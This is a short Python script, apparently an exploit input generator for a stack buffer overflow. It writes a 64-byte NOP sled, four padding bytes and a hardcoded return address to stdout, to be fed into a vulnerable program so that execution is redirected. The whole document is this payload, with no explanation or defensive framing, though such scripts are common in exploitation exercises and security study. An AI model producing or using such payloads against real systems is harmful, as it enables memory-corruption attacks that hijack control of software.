import sys
retaddr = '\x08\xcc\xff\xff'
sys.stdout.write('\x90'*0x40 + 'B'*4 + retaddr)

